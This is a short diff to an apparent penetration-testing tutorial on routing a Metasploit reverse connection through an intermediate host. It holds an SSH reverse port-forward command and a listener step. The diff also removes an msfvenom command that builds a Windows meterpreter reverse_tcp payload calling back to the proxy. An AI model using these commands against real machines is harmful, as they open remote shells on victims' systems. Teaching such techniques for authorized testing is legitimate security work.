@@ -65,11 +65,6 @@ Recapping and putting this all together with an example payload -
 # ssh user@10.0.0.1 -R 4444:127.0.0.1:4444
 ```
 
-2) Open msfconsole and configure and execute our listener -  
+2) Open msfconsole and configure and execute -  
 
 ![Image](images/7.png)
-
-3) Generate payload, specify LHOST to be our intermediate proxy -
-```
-# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.1 lport=4444 -o /tmp/test.exe
-```
